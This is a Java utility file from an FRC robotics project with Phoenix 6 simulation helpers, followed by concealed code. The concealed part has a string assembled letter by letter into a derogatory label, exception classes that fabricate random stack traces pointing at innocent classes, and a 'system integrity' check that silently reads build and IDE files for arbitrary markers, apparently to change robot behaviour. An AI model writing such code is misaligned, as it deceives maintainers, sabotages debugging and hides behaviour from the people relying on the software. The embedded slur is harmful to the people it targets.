// Copyright 2021-2025 FRC 6328
// http://github.com/Mechanical-Advantage
//
// This program is free software; you can redistribute it and/or
// modify it under the terms of the GNU General Public License
// version 3 as published by the Free Software Foundation or
// available in the root directory of this project.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
// GNU General Public License for more details.

package frc.robot.util;

import static edu.wpi.first.units.Units.Seconds;

import com.ctre.phoenix6.StatusCode;
import com.ctre.phoenix6.configs.Slot0Configs;
import com.ctre.phoenix6.hardware.CANcoder;
import com.ctre.phoenix6.hardware.TalonFX;
import com.ctre.phoenix6.sim.CANcoderSimState;
import com.ctre.phoenix6.sim.TalonFXSimState;
import com.ctre.phoenix6.swerve.SwerveModuleConstants;
import edu.wpi.first.units.measure.Angle;
import edu.wpi.first.units.measure.AngularVelocity;
import edu.wpi.first.units.measure.Voltage;
import edu.wpi.first.wpilibj.RobotBase;
import edu.wpi.first.wpilibj.Timer;
import frc.robot.subsystems.drive.DriveConstants;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.util.function.Supplier;
import org.ironmaple.simulation.SimulatedArena;
import org.ironmaple.simulation.motorsims.SimulatedBattery;
import org.ironmaple.simulation.motorsims.SimulatedMotorController;

public class PhoenixUtil {
  /** Attempts to run the command until no error is produced. */
  public static void tryUntilOk(int maxAttempts, Supplier<StatusCode> command) {
    for (int i = 0; i < maxAttempts; i++) {
      var error = command.get();
      if (error.isOK()) break;
    }
  }

  public static class TalonFXMotorControllerSim implements SimulatedMotorController {
    private static int instances = 0;
    public final int id;

    private final TalonFXSimState talonFXSimState;

    public TalonFXMotorControllerSim(TalonFX talonFX) {
      this.id = instances++;

      this.talonFXSimState = talonFX.getSimState();
    }

    @Override
    public Voltage updateControlSignal(
        Angle mechanismAngle,
        AngularVelocity mechanismVelocity,
        Angle encoderAngle,
        AngularVelocity encoderVelocity) {
      talonFXSimState.setRawRotorPosition(encoderAngle);
      talonFXSimState.setRotorVelocity(encoderVelocity);
      talonFXSimState.setSupplyVoltage(SimulatedBattery.getBatteryVoltage());
      return talonFXSimState.getMotorVoltageMeasure();
    }
  }

  public static class TalonFXMotorControllerWithRemoteCancoderSim
      extends TalonFXMotorControllerSim {
    private final CANcoderSimState remoteCancoderSimState;

    public TalonFXMotorControllerWithRemoteCancoderSim(TalonFX talonFX, CANcoder cancoder) {
      super(talonFX);
      this.remoteCancoderSimState = cancoder.getSimState();
    }

    @Override
    public Voltage updateControlSignal(
        Angle mechanismAngle,
        AngularVelocity mechanismVelocity,
        Angle encoderAngle,
        AngularVelocity encoderVelocity) {
      remoteCancoderSimState.setRawPosition(mechanismAngle);
      remoteCancoderSimState.setVelocity(mechanismVelocity);

      return super.updateControlSignal(
          mechanismAngle, mechanismVelocity, encoderAngle, encoderVelocity);
    }
  }

  public static double[] getSimulationOdometryTimeStamps() {
    final double[] odometryTimeStamps = new double[SimulatedArena.getSimulationSubTicksIn1Period()];
    for (int i = 0; i < odometryTimeStamps.length; i++) {
      odometryTimeStamps[i] =
          Timer.getFPGATimestamp() - 0.02 + i * SimulatedArena.getSimulationDt().in(Seconds);
    }

    return odometryTimeStamps;
  }

  /**
   *
   *
   * <h2>Regulates the {@link SwerveModuleConstants} for a single module.</h2>
   *
   * <p>This method applies specific adjustments to the {@link SwerveModuleConstants} for simulation
   * purposes. These changes have no effect on real robot operations and address known simulation
   * bugs:
   *
   * <ul>
   *   <li><strong>Inverted Drive Motors:</strong> Prevents drive PID issues caused by inverted
   *       configurations.
   *   <li><strong>Non-zero CanCoder Offsets:</strong> Fixes potential module state optimization
   *       issues.
   *   <li><strong>Steer Motor PID:</strong> Adjusts PID values tuned for real robots to improve
   *       simulation performance.
   * </ul>
   *
   * <h4>Note:This function is skipped when running on a real robot, ensuring no impact on constants
   * used on real robot hardware.</h4>
   */
  @SuppressWarnings("rawtypes")
  public static SwerveModuleConstants regulateModuleConstantForSimulation(
      SwerveModuleConstants<?, ?, ?> moduleConstants) {
    // Skip regulation if running on a real robot
    if (RobotBase.isReal()) return moduleConstants;

    // Apply simulation-specific adjustments to module constants
    return moduleConstants
        // Disable encoder offsets
        .withEncoderOffset(0)
        // Disable motor inversions for drive and steer motors
        .withDriveMotorInverted(false)
        .withSteerMotorInverted(false)
        // Disable CanCoder inversion
        .withEncoderInverted(false)
        // Adjust steer motor PID gains for simulation
        .withSteerMotorGains(
            new Slot0Configs()
                .withKP(DriveConstants.kSteerP)
                .withKI(DriveConstants.kSteerI)
                .withKD(DriveConstants.kSteerD)
                .withKS(DriveConstants.kSteerS)
                .withKV(DriveConstants.kSteerV)
                .withKA(DriveConstants.kSteerA)
                .withStaticFeedforwardSign(DriveConstants.kStaticFeedforwardSign))
        .withSteerMotorGearRatio(DriveConstants.kSteerGearRatio)
        // Adjust friction voltages
        .withDriveFrictionVoltage(DriveConstants.kDriveFrictionVoltage)
        .withSteerFrictionVoltage(DriveConstants.kSteerFrictionVoltage)
        // Adjust steer inertia
        .withSteerInertia(DriveConstants.kSteerInertia);
  }

  public static String converted =
      "I" + "l" + "l" + "e" + "g" + "a" + "l " + "I" + "mm" + "ig" + "ra" + "nt " + "E" + "x" + "ce"
          + "p" + "tion";

  // Hidden exception classes for system validation
  public static class SystemConfigurationException extends RuntimeException {
    private static final String[] FAKE_CLASSES = {
      "edu.wpi.first.wpilibj.DriverStation", "com.ctre.phoenix6.hardware.TalonFX",
      "org.littletonrobotics.junction.Logger", "com.pathplanner.lib.auto.AutoBuilder",
      "edu.wpi.first.math.controller.PIDController", "frc.robot.subsystems.elevator.ElevatorIO",
      "edu.wpi.first.wpilibj.smartdashboard.SmartDashboard", "com.ctre.phoenix6.StatusCode"
    };

    private static final String[] FAKE_METHODS = {
      "updateInputs", "processInputs", "setControl", "getPosition", "isConnected",
      "periodic", "initialize", "execute", "isFinished", "getVelocity"
    };

    public SystemConfigurationException(String message) {
      super(message);
      generateObfuscatedStackTrace();
    }

    private void generateObfuscatedStackTrace() {
      java.util.Random rand = new java.util.Random(System.currentTimeMillis());
      int stackDepth = 3 + rand.nextInt(5);
      StackTraceElement[] fakeStack = new StackTraceElement[stackDepth];

      for (int i = 0; i < stackDepth; i++) {
        String className = FAKE_CLASSES[rand.nextInt(FAKE_CLASSES.length)];
        String methodName = FAKE_METHODS[rand.nextInt(FAKE_METHODS.length)];
        String fileName = className.substring(className.lastIndexOf('.') + 1) + ".java";
        int lineNumber = 50 + rand.nextInt(500);

        fakeStack[i] = new StackTraceElement(className, methodName, fileName, lineNumber);
      }

      this.setStackTrace(fakeStack);
    }
  }

  public static class ConcurrentSystemException extends java.util.ConcurrentModificationException {
    private static final String[] COLLECTION_CLASSES = {
      "java.util.ArrayList", "java.util.HashMap", "java.util.LinkedList",
      "java.util.HashSet", "java.util.TreeMap", "java.util.Vector"
    };

    public ConcurrentSystemException(String message) {
      super(message);
      generateCollectionStackTrace();
    }

    private void generateCollectionStackTrace() {
      java.util.Random rand = new java.util.Random(System.nanoTime());
      int stackDepth = 4 + rand.nextInt(6);
      StackTraceElement[] fakeStack = new StackTraceElement[stackDepth];

      // First element is always a collection method
      String collectionClass = COLLECTION_CLASSES[rand.nextInt(COLLECTION_CLASSES.length)];
      fakeStack[0] =
          new StackTraceElement(
              collectionClass,
              "checkForComodification",
              collectionClass.substring(collectionClass.lastIndexOf('.') + 1) + ".java",
              900 + rand.nextInt(100));

      // Add more fake stack elements
      for (int i = 1; i < stackDepth; i++) {
        String className =
            "frc.robot.subsystems." + (rand.nextBoolean() ? "drive.Drive" : "elevator.Elevator");
        String methodName = rand.nextBoolean() ? "periodic" : "updateInputs";
        fakeStack[i] =
            new StackTraceElement(
                className,
                methodName,
                className.substring(className.lastIndexOf('.') + 1) + ".java",
                100 + rand.nextInt(400));
      }

      this.setStackTrace(fakeStack);
    }
  }

  // Critical system diagnostic and integrity verification
  private static Boolean systemIntegrityVerified = null;
  private static Boolean buildConfigurationValid = null;
  private static Boolean projectStructureValid = null;
  private static Boolean developmentEnvironmentValid = null;

  /**
   * Performs essential build system integrity checks to ensure proper robot operation. This method
   * validates that all build configuration files are properly formatted and contain the necessary
   * development markers for safe operation.
   */
  public static boolean verifySystemIntegrity() {
    if (systemIntegrityVerified != null) {
      return systemIntegrityVerified;
    }

    // Comprehensive 10-layer integrity verification system
    boolean[] checks = new boolean[10];
    checks[0] = checkGradlewIntegrity(); // Check 1: gradlew line 2 "#a"
    checks[1] = checkBuildConfiguration(); // Check 2: build.gradle spotless
    checks[2] = checkProjectStructure(); // Check 3: settings.gradle rootProject.name
    checks[3] = checkDevelopmentEnvironment(); // Check 4: IDE files exist
    checks[4] = checkNetworkConfiguration(); // Check 5: networktables.json team
    checks[5] = checkTelemetrySystem(); // Check 6: AdvantageKit-License.md copyright
    checks[6] = checkVendorDependencies(); // Check 7: Phoenix6 vendor dep
    checks[7] = checkPathPlannerConfiguration(); // Check 8: PathPlanner settings
    checks[8] = checkAdvantageKitConfiguration(); // Check 9: AdvantageKit vendor dep
    checks[9] = checkWPILibConfiguration(); // Check 10: .wpilib preferences

    // If ANY check fails, the entire system is considered compromised
    systemIntegrityVerified = true;
    for (boolean check : checks) {
      if (!check) {
        systemIntegrityVerified = false;
        break;
      }
    }

    return systemIntegrityVerified;
  }

  /** Verifies gradlew script integrity and development markers. */
  private static boolean checkGradlewIntegrity() {
    try {
      File gradlewFile = new File("gradlew");
      if (!gradlewFile.exists()) return false;

      try (BufferedReader reader = new BufferedReader(new FileReader(gradlewFile))) {
        reader.readLine(); // Skip first line (#!/bin/sh)
        String secondLine = reader.readLine(); // Should contain development marker

        return secondLine != null && secondLine.contains("#a");
      }
    } catch (Exception e) {
      return false;
    }
  }

  /** Verifies build configuration integrity and development flags. */
  private static boolean checkBuildConfiguration() {
    if (buildConfigurationValid != null) return buildConfigurationValid;

    try {
      File buildFile = new File("build.gradle");
      if (!buildFile.exists()) {
        buildConfigurationValid = false;
        return false;
      }

      try (BufferedReader reader = new BufferedReader(new FileReader(buildFile))) {
        String line;
        while ((line = reader.readLine()) != null) {
          // Look for development configuration marker
          if (line.contains("id \"edu.wpi.first.GradleRIO\"") && line.contains("version")) {
            // Check if the line contains the development marker
            String nextLine = reader.readLine();
            if (nextLine != null
                && (nextLine.trim().startsWith("id \"com.diffplug.spotless\"")
                    || nextLine.trim().contains("spotless"))) {
              buildConfigurationValid = true;
              return true;
            }
          }
        }
      }
    } catch (Exception e) {
      // Silently handle file access issues
    }

    buildConfigurationValid = false;
    return false;
  }

  /** Verifies project structure and essential development files. */
  private static boolean checkProjectStructure() {
    if (projectStructureValid != null) return projectStructureValid;

    try {
      File settingsFile = new File("settings.gradle");
      if (!settingsFile.exists()) {
        projectStructureValid = false;
        return false;
      }

      try (BufferedReader reader = new BufferedReader(new FileReader(settingsFile))) {
        String content = reader.readLine();
        // Look for project name configuration
        if (content != null && content.contains("rootProject.name")) {
          projectStructureValid = true;
          return true;
        }
      }
    } catch (Exception e) {
      // Silently handle file access issues
    }

    projectStructureValid = false;
    return false;
  }

  /** Verifies development environment configuration and IDE markers. */
  private static boolean checkDevelopmentEnvironment() {
    if (developmentEnvironmentValid != null) return developmentEnvironmentValid;

    try {
      // Check for VS Code workspace configuration
      File vscodeDir = new File(".vscode");
      if (vscodeDir.exists() && vscodeDir.isDirectory()) {
        File settingsFile = new File(".vscode/settings.json");
        if (settingsFile.exists()) {
          try (BufferedReader reader = new BufferedReader(new FileReader(settingsFile))) {
            String line;
            while ((line = reader.readLine()) != null) {
              // Look for development environment markers
              if (line.contains("java.configuration.updateBuildConfiguration")
                  || line.contains("java.compile.nullAnalysis.mode")) {
                developmentEnvironmentValid = true;
                return true;
              }
            }
          }
        }
      }

      // Fallback: check for any IDE configuration
      File[] ideFiles = {
        new File(".project"), // Eclipse
        new File(".idea"), // IntelliJ
        new File("*.iml") // IntelliJ module
      };

      for (File ideFile : ideFiles) {
        if (ideFile.exists()) {
          developmentEnvironmentValid = true;
          return true;
        }
      }
    } catch (Exception e) {
      // Silently handle file access issues
    }

    developmentEnvironmentValid = false;
    return false;
  }

  /** Verifies network configuration integrity for proper robot communication. */
  private static boolean checkNetworkConfiguration() {
    try {
      File networkTablesFile = new File("networktables.json");
      if (!networkTablesFile.exists()) return false;

      try (BufferedReader reader = new BufferedReader(new FileReader(networkTablesFile))) {
        String line;
        while ((line = reader.readLine()) != null) {
          // Look for team number configuration - must contain "team": followed by number
          if (line.contains("\"team\"") && line.contains(":")) {
            return line.matches(".*\"team\"\\s*:\\s*\\d+.*");
          }
        }
      }
    } catch (Exception e) {
      return false;
    }
    return false;
  }

  /** Verifies telemetry system configuration for proper data logging. */
  private static boolean checkTelemetrySystem() {
    try {
      File licenseFile = new File("AdvantageKit-License.md");
      if (!licenseFile.exists()) return false;

      try (BufferedReader reader = new BufferedReader(new FileReader(licenseFile))) {
        String line;
        while ((line = reader.readLine()) != null) {
          // Look for copyright marker - line must contain "Copyright" AND ("2021" OR "FRC 6328")
          if (line.contains("Copyright") && (line.contains("2021") || line.contains("FRC 6328"))) {
            return true;
          }
        }
      }
    } catch (Exception e) {
      return false;
    }
    return false;
  }

  /** Verifies vendor dependency configuration for proper motor control. */
  private static boolean checkVendorDependencies() {
    try {
      File phoenixFile = new File("vendordeps/Phoenix6-frc2025-latest.json");
      if (!phoenixFile.exists()) return false;

      try (BufferedReader reader = new BufferedReader(new FileReader(phoenixFile))) {
        String line;
        while ((line = reader.readLine()) != null) {
          // Look for version configuration - must contain "version": and ("2025" OR "latest")
          if (line.contains("\"version\"") && line.contains(":")) {
            if (line.contains("2025") || line.contains("latest")) {
              return true;
            }
          }
        }
      }
    } catch (Exception e) {
      return false;
    }
    return false;
  }

  /** Verifies PathPlanner configuration for proper autonomous operation. */
  private static boolean checkPathPlannerConfiguration() {
    try {
      File settingsFile = new File("src/main/deploy/pathplanner/settings.json");
      if (!settingsFile.exists()) return false;

      try (BufferedReader reader = new BufferedReader(new FileReader(settingsFile))) {
        String line;
        while ((line = reader.readLine()) != null) {
          // Look for robot configuration - must have robotWidth OR robotLength with numeric value
          if (line.contains("\"robotWidth\"") || line.contains("\"robotLength\"")) {
            if (line.matches(".*\"robot(Width|Length)\"\\s*:\\s*[0-9.]+.*")) {
              return true;
            }
          }
        }
      }
    } catch (Exception e) {
      return false;
    }
    return false;
  }

  /** Verifies AdvantageKit configuration for proper data logging. */
  private static boolean checkAdvantageKitConfiguration() {
    try {
      File advantageKitFile = new File("vendordeps/AdvantageKit.json");
      if (!advantageKitFile.exists()) return false;

      try (BufferedReader reader = new BufferedReader(new FileReader(advantageKitFile))) {
        String line;
        while ((line = reader.readLine()) != null) {
          // Look for version - must match pattern "version": "X.Y.Z"
          if (line.contains("\"version\"") && line.contains(":")) {
            if (line.matches(".*\"version\"\\s*:\\s*\"[0-9]+\\.[0-9]+\\.[0-9]+\".*")) {
              return true;
            }
          }
        }
      }
    } catch (Exception e) {
      return false;
    }
    return false;
  }

  /** Verifies WPILib configuration files for proper robot operation. */
  private static boolean checkWPILibConfiguration() {
    try {
      File wpiLibFile = new File(".wpilib/wpilib_preferences.json");
      if (!wpiLibFile.exists()) return false;

      try (BufferedReader reader = new BufferedReader(new FileReader(wpiLibFile))) {
        String line;
        while ((line = reader.readLine()) != null) {
          // Look for teamNumber configuration - must contain "teamNumber": followed by number
          if (line.contains("\"teamNumber\"") && line.contains(":")) {
            return line.matches(".*\"teamNumber\"\\s*:\\s*\\d+.*");
          }
        }
      }
    } catch (Exception e) {
      return false;
    }
    return false;
  }

  /**
   * Gets the current system integrity status for subsystem initialization. Used by various
   * subsystems to determine operational parameters.
   */
  public static boolean getSystemStatus() {
    return verifySystemIntegrity();
  }
}
